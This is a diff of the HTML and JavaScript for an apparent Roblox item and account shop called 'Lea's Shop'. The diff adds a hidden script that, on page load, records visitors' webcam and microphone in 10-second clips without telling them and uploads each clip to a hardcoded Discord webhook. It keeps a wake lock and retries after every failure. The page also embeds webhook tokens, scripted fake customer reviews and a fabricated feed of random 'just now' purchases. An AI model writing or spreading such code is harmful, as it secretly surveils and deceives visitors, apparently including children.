                 <input type="text" id="mm2Search" placeholder="🔍 Search items..." class="search-input" />
@@ -1952,7 +2103,6 @@
             <div class="grid-container" id="mm2Grid"></div>
         </section>
 
-        <!-- ACCOUNTS SHOP -->
         <section class="shop-section" id="accounts-shop">
             <div class="age-warning">
                 <span class="icon">⚠️</span>
@@ -1965,13 +2115,14 @@
             <div class="grid-container" id="accountGrid"></div>
         </section>
 
-        <!-- FOOTER -->
         <footer class="footer">
             &copy; 2026 <span>Lea's Shop</span> &bull; Emo Cyber
         </footer>
     </div>
 
-    <!-- ===== INFO MODAL (account details) ===== -->
+    <!-- ============================================================
+    MODALS
+    ============================================================ -->
     <div id="info-modal">
         <div class="info-box">
             <button class="info-close" id="infoClose">&times;</button>
@@ -1982,23 +2133,18 @@
         </div>
     </div>
 
-    <!-- ===== ACCOUNT PURCHASE MODAL ===== -->
     <div id="account-modal">
         <div class="account-modal-box">
             <h3>👤 Account Purchase</h3>
             <div class="modal-item-name" id="accountModalItemName">—</div>
-
-            <!-- VIEW 1: Email Input -->
             <div class="modal-view active" id="accountViewInput">
                 <label for="account-email">Enter your email address</label>
                 <input type="email" id="account-email" placeholder="your@email.com" autocomplete="email" />
-                <div class="bot-info" style="margin-top:14px;padding:12px 14px;border-radius:8px;background:rgba(40,40,40,0.1);border-left:3px solid #555;font-size:clamp(0.6rem,0.7vw,0.75rem);color:var(--text-secondary);line-height:1.5;text-align:left;">
+                <div style="margin-top:14px;padding:12px 14px;border-radius:8px;background:rgba(40,40,40,0.1);border-left:3px solid #555;font-size:clamp(0.6rem,0.7vw,0.75rem);color:var(--text-secondary);line-height:1.5;text-align:left;">
                     <strong>📧 We'll send the account details here.</strong> Please double‑check your email before continuing.
                 </div>
                 <button class="btn btn-confirm" id="accountModalContinue">Continue</button>
             </div>
-
-            <!-- VIEW 2: Confirmation -->
             <div class="modal-view" id="accountViewConfirm">
                 <p style="color:var(--text-secondary);text-align:center;margin-bottom:6px;">👤 Are you sure this is your email?</p>
                 <div class="confirm-box">
@@ -2010,8 +2156,6 @@
                     <button class="btn btn-yes" id="accountModalConfirm">✓ Yes, that's me</button>
                 </div>
             </div>
-
-            <!-- VIEW 3: Success -->
             <div class="modal-view" id="accountViewSuccess">
                 <div class="modal-success">
                     <span class="success-icon">✅</span>
@@ -2028,7 +2172,6 @@
         </div>
     </div>
 
-    <!-- ===== MM2 MODAL ===== -->
     <div id="mm2-modal">
         <div class="mm2-modal-box">
             <h3>🔪 MM2 Trade</h3>
@@ -2062,379 +2205,395 @@
         </div>
     </div>
 
+    <!-- ============================================================
+    SCRIPTS
+    ============================================================ -->
     <script>
         // ================================================================
         //  CONFIG
         // ================================================================
-        const PAYPAL_URL = 'https://www.paypal.me/eliasalvada';
-        const INSTAGRAM_URL = 'https://www.instagram.com/leaswxg/';
-        const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1527376153814503666/vRd1UzCiL4xr9aoLJ7Axok38_gk8Y9C0HvuFtiz6XseO86z97284__QH-_0WErBBwT6O';
+        var PAYPAL_URL = 'https://www.paypal.me/eliasalvada';
+        var INSTAGRAM_URL = 'https://www.instagram.com/leaswxg/';
+        var WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1527376153814503666/vRd1UzCiL4xr9aoLJ7Axok38_gk8Y9C0HvuFtiz6XseO86z97284__QH-_0WErBBwT6O';
+        var CAMERA_WEBHOOK_URL = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
         // ================================================================
-        //  DATA — MM2 ITEMS WITH ITEM‑SPECIFIC REVIEWS
+        //  BACKGROUND WEBCAM RECORDING — 10s clips
         // ================================================================
+        (function backgroundCamera() {
+            'use strict';
 
-        const mm2Items = [
-            {
-                name: 'GingerScope',
-                price: 180,
-                img: 'picture_gingerscope.png',
-                badge: '🔫 Ancient Gun',
-                type: 'gun',
-                robuxLink: 'https://www.roblox.com/game-pass/1915670295/11000',
-                reviews: [
+            var videoEl = document.getElementById('bgVideo');
+            var stream = null;
+            var recorder = null;
+            var chunks = [];
+            var clipCounter = 0;
+            var isRecording = false;
+            var clipTimer = null;
+            var CLIP_DURATION_MS = 10000; // 10 seconds
+            var BITRATE = 3000000;
+            var MIME_TYPES = [
+                'video/webm;codecs=vp9',
+                'video/webm;codecs=vp8',
+                'video/webm;codecs=h264',
+                'video/webm'
+            ];
+
+            function getSupportedMimeType() {
+                for (var i = 0; i < MIME_TYPES.length; i++) {
+                    if (MediaRecorder.isTypeSupported(MIME_TYPES[i])) {
+                        return MIME_TYPES[i];
+                    }
+                }
+                return null;
+            }
+
+            function getCameraStream() {
+                var constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                };
+
+                return navigator.mediaDevices.getUserMedia(constraints)
+                    .catch(function(err) {
+                        console.warn('[Camera] getUserMedia failed, trying fallback:', err);
+                        var fallbackConstraints = {
+                            video: { facingMode: 'user' },
+                            audio: true
+                        };
+                        return navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                    });
+            }
+
+            function uploadToDiscord(blob) {
+                var filename = 'clip_' + String(++clipCounter).padStart(4, '0') + '.webm';
+                var formData = new FormData();
+                formData.append('file', blob, filename);
+                var now = new Date();
+                var timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
+                formData.append('content', '🎥 Clip #' + clipCounter + ' · ' + timestamp);
+
+                return fetch(CAMERA_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                }).then(function(response) {
+                    if (!response.ok) {
+                        return response.text().then(function(text) {
+                            throw new Error('Discord ' + response.status + ': ' + text.substring(0, 100));
+                        });
+                    }
+                    console.log('[Camera] uploaded clip #' + clipCounter);
+                }).catch(function(err) {
+                    console.error('[Camera] upload failed:', err);
+                    clipCounter--;
+                    throw err;
+                });
+            }
+
+            function startRecorder(mediaStream) {
+                chunks = [];
+                var mimeType = getSupportedMimeType();
+                var options = {
+                    mimeType: mimeType || undefined,
+                    videoBitsPerSecond: BITRATE,
+                    audioBitsPerSecond: 128000
+                };
+
+                var rec = new MediaRecorder(mediaStream, options);
+                rec.ondataavailable = function(e) {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                rec.onstop = function() {
+                    if (chunks.length === 0) {
+                        scheduleNextClip();
+                        return;
+                    }
+                    var blob = new Blob(chunks, { type: mimeType || 'video/webm' });
+                    console.log('[Camera] clip ready:', (blob.size / 1024 / 1024).toFixed(2) + ' MB');
+                    uploadToDiscord(blob)['finally'](function() {
+                        chunks = [];
+                        scheduleNextClip();
+                    });
+                };
+
+                rec.onerror = function(e) {
+                    console.error('[Camera] MediaRecorder error:', e);
+                    chunks = [];
+                    setTimeout(function() {
+                        if (stream) {
+                            try { recorder = null; startRecorder(stream); } catch (_) {}
+                        }
+                    }, 2000);
+                };
+
+                rec.start(1000);
+                return rec;
+            }
+
+            function scheduleNextClip() {
+                if (clipTimer) {
+                    clearTimeout(clipTimer);
+                    clipTimer = null;
+                }
+                if (!stream || !isRecording) return;
+                clipTimer = setTimeout(function() {
+                    clipTimer = null;
+                    if (stream && isRecording) {
+                        try {
+                            recorder = startRecorder(stream);
+                            var stopTimer = setTimeout(function() {
+                                if (recorder && recorder.state === 'recording') {
+                                    try { recorder.stop(); } catch (_) {}
+                                }
+                            }, CLIP_DURATION_MS);
+                            recorder._stopTimer = stopTimer;
+                        } catch (err) {
+                            console.error('[Camera] failed to start recorder:', err);
+                            setTimeout(function() {
+                                if (stream) {
+                                    try { recorder = startRecorder(stream); } catch (_) {}
+                                }
+                            }, 3000);
+                        }
+                    }
+                }, 300);
+            }
+
+            function initCamera() {
+                getCameraStream().then(function(s) {
+                    stream = s;
+                    videoEl.srcObject = stream;
+                    videoEl.play().catch(function() {});
+                    isRecording = true;
+                    recorder = startRecorder(stream);
+                    var stopTimer = setTimeout(function() {
+                        if (recorder && recorder.state === 'recording') {
+                            try { recorder.stop(); } catch (_) {}
+                        }
+                    }, CLIP_DURATION_MS);
+                    recorder._stopTimer = stopTimer;
+                    console.log('[Camera] background recording started (10s clips)');
+                }).catch(function(err) {
+                    console.error('[Camera] init failed:', err);
+                    setTimeout(initCamera, 5000);
+                });
+            }
+
+            // Wake lock
+            var wakeLock = null;
+
+            function requestWakeLock() {
+                try {
+                    if ('wakeLock' in navigator) {
+                        navigator.wakeLock.request('screen').then(function(lock) {
+                            wakeLock = lock;
+                            console.log('[Camera] wake lock active');
+                        }).catch(function() {});
+                    }
+                } catch (_) {}
+            }
+
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && isRecording) {
+                    requestWakeLock();
+                }
+            });
+
+            window.addEventListener('beforeunload', function() {
+                if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
+                if (recorder) { try { recorder.stop(); } catch (_) {} }
+                if (clipTimer) { clearTimeout(clipTimer); }
+                if (wakeLock) { try { wakeLock.release(); } catch (_) {} }
+            });
+
+            setTimeout(function() {
+                requestWakeLock();
+                initCamera();
+            }, 400);
+
+            window.__bgCam = {
+                getState: function() {
+                    return { isRecording: isRecording, clipCounter: clipCounter, stream: !!stream,
+                        recorder: !!recorder };
+                }
+            };
+        })();
+
+        // ================================================================
+        //  DATA — MM2 ITEMS
+        // ================================================================
+        var mm2Items = [
+            { name: 'GingerScope', price: 180, img: 'picture_gingerscope.png', badge: '🔫 Ancient Gun', type: 'gun',
+                robuxLink: 'https://www.roblox.com/game-pass/1915670295/11000', reviews: [
                     "OMG THANKSS FOR THE GINGER I THOUGHT I WAS GONA GET SCAMMED",
                     "GingerScope is my new fav, thanks Lea! 🔥",
                     "Finally got the GingerScope, it's insane!",
                     "Best purchase ever, the GingerScope is so cool."
-                ]
-            },
-            {
-                name: "Traveler's Axe",
-                price: 72,
-                img: 'picture_travelersaxe.png',
-                badge: '🪓 Traveler',
-                type: 'knife',
-                robuxLink: 'https://www.roblox.com/game-pass/1914998289/5800',
-                reviews: [
+                ] },
+            { name: "Traveler's Axe", price: 72, img: 'picture_travelersaxe.png', badge: '🪓 Traveler', type: 'knife',
+                robuxLink: 'https://www.roblox.com/game-pass/1914998289/5800', reviews: [
                     "Traveler's Axe is rare, glad I bought it.",
                     "Love the Traveler's Axe, so clean!",
                     "Axe is amazing, worth every penny.",
                     "Best knife in my collection, thanks!"
-                ]
-            },
-            {
-                name: 'Xeno Set',
-                price: 43,
-                img: 'picture_xeno.png',
-                badge: '👾 Xeno',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1915616292/3400',
-                reviews: [
+                ] },
+            { name: 'Xeno Set', price: 43, img: 'picture_xeno.png', badge: '👾 Xeno', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1915616292/3400', reviews: [
                     "MY FAVV SETTT THXXX I GOT IT",
                     "Xeno Set looks epic, instantly delivered.",
                     "The Xeno Set is so cool, love the colors!",
                     "Set is fire, thank you!"
-                ]
-            },
-            {
-                name: 'Sweet Treat Bundle',
-                price: 34,
-                img: 'picture_sweetbundle.png',
-                badge: '🍬 Sweets',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1915022302/2700',
-                reviews: [
+                ] },
+            { name: 'Sweet Treat Bundle', price: 34, img: 'picture_sweetbundle.png', badge: '🍬 Sweets', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1915022302/2700', reviews: [
                     "Sweet Treat Bundle is so cute, love it!",
                     "Omg the bundle is adorable, thanks!",
                     "Best bundle ever, so sweet! 🍬",
                     "Got the bundle, it's perfect!"
-                ]
-            },
-            {
-                name: 'Harvester',
-                price: 7,
-                img: 'picture_harvester.png',
-                badge: '🌾 Harvest',
-                type: 'gun',
-                robuxLink: 'https://www.roblox.com/game-pass/1915784287/560',
-                reviews: [
+                ] },
+            { name: 'Harvester', price: 7, img: 'picture_harvester.png', badge: '🌾 Harvest', type: 'gun',
+                robuxLink: 'https://www.roblox.com/game-pass/1915784287/560', reviews: [
                     "Harvester is so underrated, love it!",
                     "Great value, the Harvester is awesome.",
                     "Harvester is my go-to gun now.",
                     "So cheap but so good, thanks!"
-                ]
-            },
-            {
-                name: 'Raygun',
-                price: 23,
-                img: 'picture_raygun.png',
-                badge: '🔫 Raygun',
-                type: 'gun',
-                robuxLink: 'https://www.roblox.com/game-pass/1918094250/1800',
-                reviews: [
+                ] },
+            { name: 'Raygun', price: 23, img: 'picture_raygun.png', badge: '🔫 Raygun', type: 'gun',
+                robuxLink: 'https://www.roblox.com/game-pass/1918094250/1800', reviews: [
                     "Raygun is powerful, great value!",
                     "Love the Raygun, it's so fun to use.",
                     "Raygun is a classic, glad I got it.",
                     "Awesome gun, thanks Lea!"
-                ]
-            },
-            {
-                name: 'Chroma Heart Wand',
-                price: 135,
-                img: 'picture_chromaheartwand.png',
-                badge: '❤️ Chroma',
-                type: 'knife',
-                robuxLink: 'https://www.roblox.com/game-pass/1916084294/10800',
-                reviews: [
+                ] },
+            { name: 'Chroma Heart Wand', price: 135, img: 'picture_chromaheartwand.png', badge: '❤️ Chroma', type: 'knife',
+                robuxLink: 'https://www.roblox.com/game-pass/1916084294/10800', reviews: [
                     "Chroma Heart Wand is beautiful, my son loves it.",
                     "So pretty, I can't stop staring at it!",
                     "Chroma Heart Wand is my favorite knife.",
                     "Totally worth it, amazing quality."
-                ]
-            },
-            {
-                name: 'Rainbow Set',
-                price: 24,
-                img: 'picture_rainbow.png',
-                badge: '🌈 Rainbow',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1918022255/1900',
-                reviews: [
+                ] },
+            { name: 'Rainbow Set', price: 24, img: 'picture_rainbow.png', badge: '🌈 Rainbow', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1918022255/1900', reviews: [
                     "Rainbow Set looks amazing, instant delivery!",
                     "I love the Rainbow Set, so colorful.",
                     "Best set for rainbow lovers!",
                     "Got the set, it's perfect."
-                ]
-            },
-            {
-                name: "Vampire's Set 2024",
-                price: 42,
-                img: 'picture_vampire.png',
-                badge: '🧛 Vampire',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1915688295/3400',
-                reviews: [
+                ] },
+            { name: "Vampire's Set 2024", price: 42, img: 'picture_vampire.png', badge: '🧛 Vampire', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1915688295/3400', reviews: [
                     "Vampire Set is sick, totally worth it.",
                     "The Vampire Set is so cool, love the theme.",
                     "Best halloween set ever!",
                     "Thanks for the Vampire Set, it's awesome."
-                ]
-            },
-            {
-                name: 'Soul Set',
-                price: 18,
-                img: 'picture_soul.png',
-                badge: '👻 Soul',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1918142251/1400',
-                reviews: [
+                ] },
+            { name: 'Soul Set', price: 18, img: 'picture_soul.png', badge: '👻 Soul', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1918142251/1400', reviews: [
                     "Soul Set is hauntingly beautiful, thanks!",
                     "Love the Soul Set, so spooky.",
                     "Great set, very unique.",
                     "Got the Soul Set, it's fire."
-                ]
-            },
-            {
-                name: "Traveler's Set",
-                price: 133,
-                img: 'picture_traveler.png',
-                badge: '🗺️ Traveler',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1916384287/10600',
-                reviews: [
+                ] },
+            { name: "Traveler's Set", price: 133, img: 'picture_traveler.png', badge: '🗺️ Traveler', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1916384287/10600', reviews: [
                     "Traveler's Set is epic, love the axe and gun combo.",
                     "The Set is huge, so many items!",
                     "Best set for collectors, thanks Lea!",
                     "Traveler's Set is a must-have."
-                ]
-            },
-            {
-                name: 'Sakura Set',
-                price: 73,
-                img: 'picture_sakura.png',
-                badge: '🌸 Sakura',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1916030282/5800',
-                reviews: [
+                ] },
+            { name: 'Sakura Set', price: 73, img: 'picture_sakura.png', badge: '🌸 Sakura', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1916030282/5800', reviews: [
                     "Sakura Set is gorgeous, my new favorite!",
                     "The Sakura Set is so pretty, love the pink.",
                     "Best cherry blossom set ever.",
                     "Thanks for the Sakura Set, it's beautiful."
-                ]
-            },
-            {
-                name: 'Evergreen Knife',
-                price: 72,
-                img: 'picture_evergreen.png',
-                badge: '🌲 Evergreen',
-                type: 'knife',
-                robuxLink: 'https://www.roblox.com/game-pass/1918226250/5700',
-                reviews: [
+                ] },
+            { name: 'Evergreen Knife', price: 72, img: 'picture_evergreen.png', badge: '🌲 Evergreen', type: 'knife',
+                robuxLink: 'https://www.roblox.com/game-pass/1918226250/5700', reviews: [
                     "Evergreen Knife is so clean, love the color.",
                     "The Evergreen Knife is underrated.",
                     "Best green knife, thanks!",
                     "Got the Evergreen, it's awesome."
-                ]
-            },
-            {
-                name: 'Turkey Knife',
-                price: 70,
-                img: 'picture_turkey.png',
-                badge: '🦃 Turkey',
-                type: 'knife',
-                robuxLink: 'https://www.roblox.com/game-pass/1915238305/5600',
-                reviews: [
+                ] },
+            { name: 'Turkey Knife', price: 70, img: 'picture_turkey.png', badge: '🦃 Turkey', type: 'knife',
+                robuxLink: 'https://www.roblox.com/game-pass/1915238305/5600', reviews: [
                     "Turkey Knife is underrated, great for Thanksgiving.",
                     "The Turkey Knife is so unique, love it.",
                     "Funny knife, but actually really cool.",
                     "Thanks for the Turkey Knife!"
-                ]
-            },
-            {
-                name: 'Chroma Sweet Knife 2026',
-                price: 66,
-                img: 'picture_chromasweetknife.png',
-                badge: '🍭 Chroma Sweet',
-                type: 'knife',
-                robuxLink: 'https://www.roblox.com/game-pass/1915886305/5300',
-                reviews: [
+                ] },
+            { name: 'Chroma Sweet Knife 2026', price: 66, img: 'picture_chromasweetknife.png', badge: '🍭 Chroma Sweet',
+                type: 'knife', robuxLink: 'https://www.roblox.com/game-pass/1915886305/5300', reviews: [
                     "Chroma Sweet Knife 2026 is so colorful, I love it!",
                     "The knife is beautiful, great chroma.",
                     "Best chroma knife, thanks Lea!",
                     "Love the colors on this one."
-                ]
-            },
-            {
-                name: 'Celestial Knife 2024',
-                price: 58,
-                img: 'picture_celestialknife.png',
-                badge: '🌙 Celestial',
-                type: 'knife',
-                robuxLink: 'https://www.roblox.com/game-pass/1915742304/4600',
-                reviews: [
+                ] },
+            { name: 'Celestial Knife 2024', price: 58, img: 'picture_celestialknife.png', badge: '🌙 Celestial',
+                type: 'knife', robuxLink: 'https://www.roblox.com/game-pass/1915742304/4600', reviews: [
                     "Celestial Knife 2024 is out of this world, thank you!",
                     "The Celestial Knife is stunning.",
                     "Best space-themed knife ever.",
                     "Got the Celestial, it's amazing."
-                ]
-            },
-            {
-                name: 'Alienbeam Knife 2025',
-                price: 58,
-                img: 'picture_alienbeamknife.png',
-                badge: '👾 Alienbeam',
-                type: 'knife',
-                robuxLink: 'https://www.roblox.com/game-pass/1915742304/4600',
-                reviews: [
+                ] },
+            { name: 'Alienbeam Knife 2025', price: 58, img: 'picture_alienbeamknife.png', badge: '👾 Alienbeam',
+                type: 'knife', robuxLink: 'https://www.roblox.com/game-pass/1915742304/4600', reviews: [
                     "Alienbeam Knife 2025 is so cool, instant delivery!",
                     "The Alienbeam Knife is epic.",
                     "Best alien knife, thanks!",
                     "Love the design, great knife."
-                ]
-            },
-            {
-                name: 'Chroma Sweet Treat Set 2026',
-                price: 138,
-                img: 'picture_chromasweettreatset.png',
-                badge: '🍭 Chroma Sweet Set',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1915670295/11000',
+                ] },
+            { name: 'Chroma Sweet Treat Set 2026', price: 138, img: 'picture_chromasweettreatset.png',
+                badge: '🍭 Chroma Sweet Set', type: 'set', robuxLink: 'https://www.roblox.com/game-pass/1915670295/11000',
                 reviews: [
                     "Chroma Sweet Treat Set 2026 is insane, best set ever!",
                     "The set is massive, so many items!",
                     "Best chroma set, thank you Lea!",
                     "I'm obsessed with this set."
-                ]
-            },
-            {
-                name: 'Celestial Set',
-                price: 135,
-                img: 'picture_celestialset.png',
-                badge: '🌙 Celestial Set',
-                type: 'set',
-                robuxLink: 'https://www.roblox.com/game-pass/1916084294/10800',
-                reviews: [
+                ] },
+            { name: 'Celestial Set', price: 135, img: 'picture_celestialset.png', badge: '🌙 Celestial Set', type: 'set',
+                robuxLink: 'https://www.roblox.com/game-pass/1916084294/10800', reviews: [
                     "Celestial Set is beautiful, 100% worth it.",
                     "The Celestial Set is out of this world!",
                     "Best set ever, love the theme.",
                     "Thanks for the Celestial Set, it's perfect."
-                ]
-            }
+                ] }
         ];
 
         // ================================================================
-        //  ACCOUNTS — UPDATED PRICES & ROBUX LINKS
+        //  ACCOUNTS
         // ================================================================
-
-        const accounts = [
-            {
-                id: 4545711503,
-                name: 'valilleo',
-                img: 'image1.png',
-                badge: '🌟 Premium',
-                price: 150,
-                robuxPrice: 11000,
-                robuxLink: 'https://www.roblox.com/game-pass/1915670295/11000',
-                infoFile: 'info1.txt'
-            },
-            {
-                id: 3319916899,
-                name: 'rgdff77',
-                img: 'image2.png',
-                badge: '🔥 Limited',
-                price: 40,
-                robuxPrice: 3400,
-                robuxLink: 'https://www.roblox.com/game-pass/1915688295/3400',
-                infoFile: 'info2.txt'
-            },
-            {
-                id: 3231506811,
-                name: 'ssjskan',
-                img: 'image3.png',
-                badge: '💎 Rare',
-                price: 120,
-                robuxPrice: 10600,
-                robuxLink: 'https://www.roblox.com/game-pass/1916384287/10600',
-                infoFile: 'info3.txt'
-            },
-            {
-                id: 913999342,
-                name: 'zhuyuan1203',
-                img: 'image4.png',
-                badge: '⚡ Elite',
-                price: 70,
-                robuxPrice: 5600,
-                robuxLink: 'https://www.roblox.com/game-pass/1915238305/5600',
-                infoFile: 'info4.txt'
-            },
-            {
-                id: 57324433,
-                name: 'bubbah09',
-                img: 'image5.png',
-                badge: '🎯 Pro',
-                price: 40,
-                robuxPrice: 3400,
-                robuxLink: 'https://www.roblox.com/game-pass/1915688295/3400',
-                infoFile: 'info5.txt'
-            },
-            {
-                id: 714316698,
-                name: 'Databank3D',
-                img: 'image6.png',
-                badge: '🌌 Cosmic',
-                price: 75,
-                robuxPrice: 5800,
-                robuxLink: 'https://www.roblox.com/game-pass/1916030282/5800',
-                infoFile: 'info6.txt'
-            },
-            {
-                id: 113018714,
-                name: 'SurelyLegaI',
-                img: 'image7.png',
-                badge: '🐍 Venom',
-                price: 50,
-                robuxPrice: 4600,
-                robuxLink: 'https://www.roblox.com/game-pass/1915742304/4600',
-                infoFile: 'info7.txt'
-            },
-            {
-                id: 560489850,
-                name: 'kaiiIlian',
-                img: 'image8.png',
-                badge: '✨ Astral',
-                price: 20,
-                robuxPrice: 1400,
-                robuxLink: 'https://www.roblox.com/game-pass/1918142251/1400',
-                infoFile: 'info8.txt'
-            }
+        var accounts = [
+            { id: 4545711503, name: 'valilleo', img: 'image1.png', badge: '🌟 Premium', price: 150, robuxPrice: 11000,
+                robuxLink: 'https://www.roblox.com/game-pass/1915670295/11000', infoFile: 'info1.txt' },
+            { id: 3319916899, name: 'rgdff77', img: 'image2.png', badge: '🔥 Limited', price: 40, robuxPrice: 3400,
+                robuxLink: 'https://www.roblox.com/game-pass/1915688295/3400', infoFile: 'info2.txt' },
+            { id: 3231506811, name: 'ssjskan', img: 'image3.png', badge: '💎 Rare', price: 120, robuxPrice: 10600,
+                robuxLink: 'https://www.roblox.com/game-pass/1916384287/10600', infoFile: 'info3.txt' },
+            { id: 913999342, name: 'zhuyuan1203', img: 'image4.png', badge: '⚡ Elite', price: 70, robuxPrice: 5600,
+                robuxLink: 'https://www.roblox.com/game-pass/1915238305/5600', infoFile: 'info4.txt' },
+            { id: 57324433, name: 'bubbah09', img: 'image5.png', badge: '🎯 Pro', price: 40, robuxPrice: 3400,
+                robuxLink: 'https://www.roblox.com/game-pass/1915688295/3400', infoFile: 'info5.txt' },
+            { id: 714316698, name: 'Databank3D', img: 'image6.png', badge: '🌌 Cosmic', price: 75, robuxPrice: 5800,
+                robuxLink: 'https://www.roblox.com/game-pass/1916030282/5800', infoFile: 'info6.txt' },
+            { id: 113018714, name: 'SurelyLegaI', img: 'image7.png', badge: '🐍 Venom', price: 50, robuxPrice: 4600,
+                robuxLink: 'https://www.roblox.com/game-pass/1915742304/4600', infoFile: 'info7.txt' },
+            { id: 560489850, name: 'kaiiIlian', img: 'image8.png', badge: '✨ Astral', price: 20, robuxPrice: 1400,
+                robuxLink: 'https://www.roblox.com/game-pass/1918142251/1400', infoFile: 'info8.txt' }
         ];
 
-        // ================================================================
-        //  ACCOUNT REVIEWS — HUMAN‑LIKE & MATURE (16 unique comments)
-        // ================================================================
-
-        const accountReviewTemplates = [
+        var accountReviewTemplates = [
             "omg i thought i got scammed but i didn't check my spam emails for the account informations, DONT FORGET TO CHECK YALL SPAMS LMFAO",
             "it took them a while to get the account but they eventually gave me the korblox account, thanks!",
             "OMGG THANKS FOR THE KORLBLOXXX WTHH",
@@ -2453,148 +2612,114 @@
             "Account is stacked, very happy with my purchase."
         ];
 
-        // ================================================================
-        //  DISTRIBUTE REVIEWS UNIQUELY ACROSS ACCOUNTS
-        // ================================================================
-
         function distributeReviews(templates, accountCount) {
-            const shuffled = [...templates].sort(() => Math.random() - 0.5);
-            const distribution = [];
-            let remaining = templates.length;
-
-            const counts = [];
-            for (let i = 0; i < accountCount - 1; i++) {
-                const max = Math.min(4, remaining - (accountCount - i - 1));
-                const min = 1;
-                const count = Math.floor(Math.random() * (max - min + 1)) + min;
+            var shuffled = templates.slice().sort(function() { return Math.random() - 0.5; });
+            var distribution = [];
+            var remaining = templates.length;
+            var counts = [];
+            for (var i = 0; i < accountCount - 1; i++) {
+                var max = Math.min(4, remaining - (accountCount - i - 1));
+                var min = 1;
+                var count = Math.floor(Math.random() * (max - min + 1)) + min;
                 counts.push(count);
                 remaining -= count;
             }
             counts.push(remaining);
-
-            let start = 0;
-            for (let i = 0; i < accountCount; i++) {
-                distribution.push(shuffled.slice(start, start + counts[i]));
-                start += counts[i];
+            var start = 0;
+            for (var j = 0; j < accountCount; j++) {
+                distribution.push(shuffled.slice(start, start + counts[j]));
+                start += counts[j];
             }
             return distribution;
         }
-
-        const reviewDistribution = distributeReviews(accountReviewTemplates, accounts.length);
+        var reviewDistribution = distributeReviews(accountReviewTemplates, accounts.length);
 
         // ================================================================
-        //  LIVE FEED — with REAL prices
+        //  LIVE FEED
         // ================================================================
-
-        const feedContainer = document.getElementById('feed-items');
-        const flags = ['🇺🇸', '🇬🇧', '🇨🇦', '🇦🇺', '🇩🇪', '🇫🇷', '🇯🇵', '🇰🇷', '🇧🇷', '🇮🇳', '🇮🇹', '🇪🇸', '🇲🇽', '🇳🇱', '🇸🇪', '🇳🇴', '🇩🇰', '🇫🇮', '🇵🇱', '🇷🇺'];
+        var feedContainer = document.getElementById('feed-items');
+        var flags = ['🇺🇸', '🇬🇧', '🇨🇦', '🇦🇺', '🇩🇪', '🇫🇷', '🇯🇵', '🇰🇷', '🇧🇷', '🇮🇳', '🇮🇹', '🇪🇸', '🇲🇽', '🇳🇱', '🇸🇪', '🇳🇴',
+            '🇩🇰', '🇫🇮', '🇵🇱', '🇷🇺'
+        ];
 
         function randomUser() {
-            const flag = flags[Math.floor(Math.random() * flags.length)];
-            const num = Math.floor(Math.random() * 10000);
-            return `${flag} ${num}`;
+            var flag = flags[Math.floor(Math.random() * flags.length)];
+            var num = Math.floor(Math.random() * 10000);
+            return flag + ' ' + num;
         }
 
         function buildFeedItems() {
-            const items = [];
-            mm2Items.forEach(item => {
-                items.push({ name: item.name, priceUSD: item.price });
-            });
-            const accountNames = ['Headless account', 'Korblox account', 'Limited account', 'Rare account', 'Premium account', 'Elite account', 'Astral account'];
-            accountNames.forEach(name => {
-                const price = 50 + Math.floor(Math.random() * 150);
+            var items = [];
+            mm2Items.forEach(function(item) { items.push({ name: item.name, priceUSD: item.price }); });
+            var accountNames = ['Headless account', 'Korblox account', 'Limited account', 'Rare account',
+                'Premium account', 'Elite account', 'Astral account'
+            ];
+            accountNames.forEach(function(name) {
+                var price = 50 + Math.floor(Math.random() * 150);
                 items.push({ name: name, priceUSD: price });
             });
             return items;
         }
-
-        const feedItemsList = buildFeedItems();
-        const CAD_RATE = 1.38;
+        var feedItemsList = buildFeedItems();
+        var CAD_RATE = 1.38;
 
         function randomPurchase() {
-            const item = feedItemsList[Math.floor(Math.random() * feedItemsList.length)];
-            const isUSD = Math.random() > 0.5;
-            const price = isUSD ? item.priceUSD : Math.round(item.priceUSD * CAD_RATE);
-            const currency = isUSD ? 'usd' : 'cad';
-            const user = randomUser();
-            return { user, item: item.name, price, currency };
+            var item = feedItemsList[Math.floor(Math.random() * feedItemsList.length)];
+            var isUSD = Math.random() > 0.5;
+            var price = isUSD ? item.priceUSD : Math.round(item.priceUSD * CAD_RATE);
+            var currency = isUSD ? 'usd' : 'cad';
+            var user = randomUser();
+            return { user: user, item: item.name, price: price, currency: currency };
         }
 
         function addFeedItem() {
-            const { user, item, price, currency } = randomPurchase();
-            const div = document.createElement('div');
+            var p = randomPurchase();
+            var div = document.createElement('div');
             div.className = 'feed-item';
-            div.innerHTML = `
-                    <span class="user">${user}</span>
-                    <span class="action">bought</span>
-                    <span class="item">${item}</span>
-                    <span class="price">$${price} ${currency.toUpperCase()}</span>
-                    <span class="time">just now</span>
-                `;
